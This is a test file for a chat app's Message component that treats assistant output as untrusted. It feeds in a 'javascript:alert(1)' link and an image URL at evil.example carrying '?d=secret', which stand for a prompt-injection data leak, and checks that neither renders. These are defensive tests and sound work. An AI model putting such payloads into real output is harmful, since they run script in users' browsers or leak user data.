import { render, screen } from '@testing-library/react';
import { describe, expect, it } from 'vitest';
import Message from '../components/Message';

const assistant = (content: string) => ({ id: '1', role: 'assistant' as const, content });

describe('Message (untrusted model output)', () => {
  it('does not render javascript: links', () => {
    const { container } = render(<Message message={assistant('[click me](javascript:alert(1))')} onOpenDoc={() => {}} />);
    expect(container.querySelector('a[href^="javascript"]')).toBeNull();
    expect(screen.getByText('click me')).toBeInTheDocument();
  });

  it('never renders images (prompt-injected images could leak data via their URL)', () => {
    const { container } = render(<Message message={assistant('![x](https://evil.example/p.png?d=secret)')} onOpenDoc={() => {}} />);
    expect(container.querySelector('img')).toBeNull();
  });

  it('still renders citations as pills and https links as links', () => {
    render(<Message message={assistant('Gap [Job #1 › Skills] see [docs](https://example.com)')} onOpenDoc={() => {}} />);
    expect(screen.getByRole('button', { name: 'Job #1 › Skills' })).toBeInTheDocument();
    expect(screen.getByRole('link', { name: 'docs' })).toHaveAttribute('href', 'https://example.com');
  });
});
